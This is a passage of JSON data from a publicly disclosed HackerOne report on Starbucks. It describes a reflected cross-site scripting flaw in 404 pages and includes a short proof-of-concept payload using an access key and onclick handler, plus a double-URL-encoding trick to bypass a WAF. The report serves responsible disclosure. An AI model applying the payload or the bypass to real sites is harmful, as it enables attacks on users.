███████.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-25T15:38:44.340Z","updated_at":"2019-10-02T18:41:47.860Z","first_to_agree":true,"actor":{"username":"stealthy","cleared":true,"url":"/stealthy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6058057,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-16T18:53:26.000Z","updated_at":"2019-10-16T18:53:26.000Z","actor":{"username":"agedsumatra","cleared":false,"url":"/agedsumatra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6058058,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-16T18:53:26.105Z","updated_at":"2019-10-16T18:53:26.105Z","actor":{"username":"agedsumatra","cleared":false,"url":"/agedsumatra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":18523,"category":"team","content":"@stealthy discovered that invalid page requests resulting in a 404 error page response were vulnerable to Reflected Cross-site Scripting (XSS) when double encoding a link and persuading the user to press an unusual key combination.\n\nThank you @stealthy for bringing this to our attention and helping to resolve the issue.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e\u003ca href=\"/stealthy\"\u003e@stealthy\u003c/a\u003e discovered that invalid page requests resulting in a 404 error page response were vulnerable to Reflected Cross-site Scripting (XSS) when double encoding a link and persuading the user to press an unusual key combination.\u003c/p\u003e\n\n\u003cp\u003eThank you \u003ca href=\"/stealthy\"\u003e@stealthy\u003c/a\u003e for bringing this to our attention and helping to resolve the issue.\u003c/p\u003e\n"},{"id":18382,"category":"researcher","content":"Reflected cross-site scripting on multiple Starbucks in scope assets. The reflection took place in hidden inputs and exploitation required user interaction. This vulnerability affected 404 not found pages. \n\nPOC:```\"accesskey='x' onclick='confirm`1`' //``` in URL path with double URL encoding to bypass WAF. ","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eReflected cross-site scripting on multiple Starbucks in scope assets. The reflection took place in hidden inputs and exploitation required user interaction. This vulnerability affected 404 not found pages. \u003c/p\u003e\n\n\u003cp\u003ePOC:\u003ccode\u003e\u0026quot;accesskey=\u0026#39;x\u0026#39; onclick=\u0026#39;confirm`1`\u0026#39; //\u003c/code\u003e in URL path with double URL encoding to bypass WAF. \u003c/p\u003e\n"}]}